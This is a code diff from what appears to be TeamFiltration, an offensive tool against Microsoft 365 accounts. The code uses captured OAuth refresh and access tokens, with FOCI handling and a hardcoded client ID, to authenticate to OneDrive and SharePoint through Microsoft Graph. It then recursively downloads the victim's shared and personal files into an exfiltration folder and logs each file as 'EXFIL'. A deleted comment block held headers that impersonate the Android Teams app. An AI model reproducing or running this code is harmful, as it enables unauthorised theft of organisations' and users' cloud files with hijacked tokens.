@@ -8,6 +8,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
+using System.Net.Http.Headers;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -41,23 +42,6 @@ namespace TeamFiltration.Handlers
 
             _oneDrive = new OneDriveGraphApi("1fec8e78-bce4-4aaf-ab1b-5451cc387264");
             _oneDrive.FireProxAuthUrl = teamFiltrationConfig.GetBaseUrl().Replace("/common/oauth2/token", "/common/oauth2/v2.0/token");
-            /*
-            oneDrive.headerListObject = new List<(string header, string value)>() {
-
-            ("x-client-current-telemetry", " 2|29,1|,,,,,"),
-            ("x-client-CPU", "x86"),
-            ("x-client-Ver", "2.0.4"),
-            ("x-client-brkrver", "3.3.9"),
-            ("x-client-DM", "SM-G955F"),
-            ("x-client-OS", "25"),
-            ("x-app-ver", "1416/1.0.0.2021012201"),
-            ("x-client-SKU", "MSAL.Android"),
-            ("x-app-name", "com.microsoft.teams")
-
-             };
-            */
-
-            //_oneDrive.AuthenticateUsingRefreshToken(getBearToken.refresh_token).GetAwaiter().GetResult();
 
             if (string.IsNullOrEmpty(getBearToken.foci))
             {
@@ -79,11 +63,11 @@ namespace TeamFiltration.Handlers
                 _oneDrive.AuthenticateUsingRefreshToken(getBearToken.refresh_token).GetAwaiter().GetResult();
             }
 
-
+            //TODO: Add a WAY less shitty way of doing this
 
 
             _oneDriveClient = new HttpClient();
-            _oneDriveClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {getBearToken.access_token}");
+            _oneDriveClient.DefaultRequestHeaders.Add("Authorization", $"Bearer { _oneDrive.AccessToken.AccessToken}");
 
 
             if (_oneDrive.headerListObject != null)
@@ -95,7 +79,10 @@ namespace TeamFiltration.Handlers
                 }
             }
 
-
+            _oneDriveClient.DefaultRequestHeaders.CacheControl = new CacheControlHeaderValue
+            {
+                NoCache = true
+            };
         }
 
 
@@ -363,28 +350,35 @@ namespace TeamFiltration.Handlers
         public async Task GetShared(string exfilFolder, OneDriveItem oneDriveItem = null)
         {
 
-            var fullPath = Path.Combine(exfilFolder, "OneDriveShared");
+            var fullPath = Path.Combine(exfilFolder, "SharedFiles");
             Directory.CreateDirectory(fullPath);
 
             if (oneDriveItem == null)
             {
 
 
-
-
-                var userSharedItems = await _oneDrive.GetSharedWithMe();
-                foreach (var sharedItem in userSharedItems.Collection)
+                try
                 {
-                    if (sharedItem.Folder == null)
+                    var userSharedItems = await _oneDrive.GetSharedWithMe();
+                    foreach (var sharedItem in userSharedItems.Collection)
                     {
+                        if (sharedItem.Folder == null)
+                        {
 
-                        var tempName = Path.Combine(fullPath, sharedItem.Name);
-                        var file = await _oneDrive.DownloadItemAndSaveAs(sharedItem, tempName);
+                            var tempName = Path.Combine(fullPath, sharedItem.Name);
+                            var file = await _oneDrive.DownloadItemAndSaveAs(sharedItem, tempName);
+                        }
+                        else
+                        {
+                            await GetShared(exfilFolder, sharedItem);
+                        }
+
+
                     }
-                    else
-                    {
-                        await GetShared(exfilFolder, sharedItem);
-                    }
+
+                }
+                catch (Exception)
+                {
 
 
                 }
@@ -416,7 +410,7 @@ namespace TeamFiltration.Handlers
 
         public async Task DumpPersonalOneDrive(string outPath)
         {
-            var fullPath = Path.Combine(outPath, "OneDrive");
+            var fullPath = Path.Combine(outPath, "SyncedFiles");
             Directory.CreateDirectory(fullPath);
 
 
@@ -433,7 +427,7 @@ namespace TeamFiltration.Handlers
 
                     _databaseHandler.WriteLog(new Log("EXFIL", "-->" + oneDriveItem.Name));
 
-                    if (!File.Exists(Path.Combine(fullPath, oneDriveItem.Name)))
+                    if (!File.Exists(Path.Combine(fullPath, oneDriveItem.Name)) && oneDriveItem.Name.EndsWith(".dat"))
                         await _oneDrive.DownloadItem(oneDriveItem, fullPath);
                 }
                 catch (Exception e)
@@ -494,6 +488,11 @@ namespace TeamFiltration.Handlers
 
         }
 
+        public async Task<SharePointSite> GetSiteRoot()
+        {
+            return await _oneDrive.GetSiteRoot();
+        }
+
         public async Task<DownloadUrlResp> GetDownloadInfo(string baseUrl)
         {
             var oneDriveUrl = $"{baseUrl}/driveItem?select=@microsoft.graph.downloadUrl";
@@ -515,7 +514,7 @@ namespace TeamFiltration.Handlers
             using (var webClient = new WebClient())
             {
 
-                foreach (var file in recentFiles.value.Where(x => x.objectUrl.StartsWith(_getBearToken.resource)))
+                foreach (Value file in recentFiles.value.Where(x => x.objectUrl.StartsWith(_getBearToken.resource)))
                 {
                     try
                     {
